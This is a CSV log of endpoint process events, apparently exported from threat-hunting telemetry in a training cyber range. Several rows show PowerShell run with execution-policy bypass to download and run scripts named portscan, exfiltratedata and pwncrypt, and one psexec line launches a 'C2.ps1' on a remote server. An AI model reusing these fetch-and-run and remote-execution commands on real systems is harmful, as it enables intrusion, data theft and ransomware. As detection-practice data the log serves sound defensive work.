Timestamp,ProcessCommandLine,FileName,FolderPath,SHA256
"Jun 16, 2025 6:32:59 PM","""cmd.exe"" /c psexec \\centralsrvr -u adminuser -p ********** powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1 ",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:37:31 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script21.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:37:31 PM",powershell  -ExecutionPolicy Unrestricted -File script21.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 6:37:35 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:37:35 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 6:37:41 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:37:41 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 6:49:23 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script22.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:49:23 PM",powershell  -ExecutionPolicy Unrestricted -File script22.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 6:49:27 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:49:27 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 6:49:33 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 6:49:33 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 7:09:01 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'a82c6e6a6ea7e12ad7b6f4d282fb14e9d9aa670967295438b00498fd214d65e3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 8:01:00 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '7f77a0c3c469abc006cb762cbe047417374e5729e73608ddf4d729fead6644d3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 8:06:00 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '44a721ee87a398f80fccb45ed39e75c0ee27dbe127c4117de8b65e82aa6570c1')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 8:47:32 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '97fc9d41881a756dcda3fbb86c79e56b1073dfdfb9905d14d7637b08b758721d')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 8:59:12 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '9bba0ac96267c73775647edbd390867424ce69bf2bc4475c12304374eec6a461')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 9:13:53 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '3a26feba614cf2d0e0de23f730b90b20f589a191c03904d0e72c97c19a96e953')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 9:14:53 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e371fa0-b3cb-4d76-93ad-467add004280.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e371fa0-b3cb-4d76-93ad-467add004280.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'baa132abb9c7e79babde3b1e509587b92b392c4910232ac0a597b2c8dce4570b')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e371fa0-b3cb-4d76-93ad-467add004280.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 9:15:43 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '45f85dba018d9c516d006f6765b6c3bd9aedcf5fb8f0c5f587384683e9d26a25')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 9:28:34 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '415daa67792f4aa9c21b812ef8de6f4da8f90b3e5842d8c9ba8e21a7f6774804')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:15 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script23.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:15 PM",powershell  -ExecutionPolicy Unrestricted -File script23.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:18 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:18 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:24 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:24 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:20:32 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'd7a658288ffc136a83692b92ee05a6f6a5a8dad3020af48a04c4a3274f140883')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:17 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script24.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:17 PM",powershell  -ExecutionPolicy Unrestricted -File script24.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:20 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:20 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:27 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:27 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:29 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script25.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:29 PM",powershell  -ExecutionPolicy Unrestricted -File script25.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:31 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:31 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:41 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:41 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:42:24 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '46e6572a1b52c13498d2a82b92c3d0df1146f8411d335497829cd9c5d859a07c')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:23 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script26.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:24 PM",powershell  -ExecutionPolicy Unrestricted -File script26.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:28 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:28 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:34 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:35 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
